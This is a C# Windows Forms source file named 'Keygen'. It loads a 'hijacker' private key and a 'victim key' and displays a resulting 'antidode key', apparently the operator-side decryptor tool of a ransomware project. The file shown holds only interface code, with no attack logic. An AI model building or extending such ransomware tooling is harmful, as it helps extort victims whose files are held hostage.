using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keygen
{
    public partial class FrmApp : Form
    {
        public FrmApp()
        {
            InitializeComponent();
        }

        private void btnGenerate_Click(object sender, EventArgs e)
        {
            VICTIM.Instance.HIJACKER_PRIVATE_KEY = System.IO.File.ReadAllText(this.tBoxHijackerPrivakeKeyPath.Text);
            VICTIM.Instance.VICTIM_KEY = this.tBoxVictimKey.Text;
            this.tBoxAntidodeKey.Text = VICTIM.Instance.ANTIDODE_KEY;
        }

        private void FrmApp_Load(object sender, EventArgs e)
        {
        }

        private void btnBrowseHijackerPrivateKey_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog
            {
                Title = "Browse Keys",

                CheckFileExists = true,
                CheckPathExists = true,

                DefaultExt = "key",
                Filter = "Keys (*.key)|*.key",
                FilterIndex = 1,
                RestoreDirectory = true,

                ReadOnlyChecked = true,
                ShowReadOnly = true
            };

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                this.tBoxHijackerPrivakeKeyPath.Text = ofd.FileName;
            }
        }
    }
}
